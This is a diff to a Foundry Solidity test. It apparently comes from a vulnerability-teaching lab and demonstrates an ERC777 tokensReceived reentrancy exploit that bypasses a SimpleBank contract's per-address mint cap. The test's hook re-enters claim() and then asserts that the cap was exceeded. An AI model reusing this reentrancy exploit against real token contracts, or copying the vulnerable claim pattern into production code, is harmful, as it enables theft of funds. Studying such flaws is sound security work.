@@ -48,29 +48,18 @@ contract ContractTest is Test {
         IERC1820Registry registry = IERC1820Registry(
             address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
         );
-        // tokensReceived Hook
-        // The token contract MUST call the tokensReceived hook of the recipient if the recipient registers an ERC777TokensRecipient implementation via ERC-1820.
         registry.setInterfaceImplementer(
             address(this),
             _TOKENS_RECIPIENT_INTERFACE_HASH,
             address(this)
         );
-        //set up env
+
         SimpleBankContract = new SimpleBank(address(MyERC777TokenContract));
         MyERC777TokenContract.mint(address(SimpleBankContract), 10000, "", "");
-
-        console.log(
-            "Maximum claims is 1,000 for each EOA, How can you bypass this limitation?"
-        );
-        console.log(
-            "Before exploiting, My GLD Balance :",
-            MyERC777TokenContract.balanceOf(address(this))
-        );
-        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.
-        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.
-        console.log(
-            "After exploiting, My GLD Balance :",
-            MyERC777TokenContract.balanceOf(address(this))
+        SimpleBankContract.claim(address(this), 900);
+        assertGt(
+            SimpleBankContract._mints(address(this)),
+            SimpleBankContract.maxMintsPerAddress()
         );
     }
 
@@ -82,10 +71,12 @@ contract ContractTest is Test {
         bytes calldata data,
         bytes calldata operatorData
     ) external {
-        if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {
-            console.log("Reentered");
-            // exploit here, claim 1,000 tokens.
-            SimpleBank(operator).claim(address(this), 1000);
+        console.log("tokensReceived called !");
+        if (
+            MyERC777TokenContract.balanceOf(address(SimpleBankContract)) >= 900
+        ) {
+            console.log("transffering 900 tokens !");
+            SimpleBankContract.claim(address(this), 900);
         }
     }
 
@@ -109,7 +100,7 @@ contract MyERC777 is ERC777 {
 
 contract SimpleBank is Test {
     ERC777 private token;
-    uint maxMintsPerAddress = 1000;
+    uint public maxMintsPerAddress = 1000;
     mapping(address => uint256) public _mints;
     bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
         keccak256("ERC777TokensRecipient");
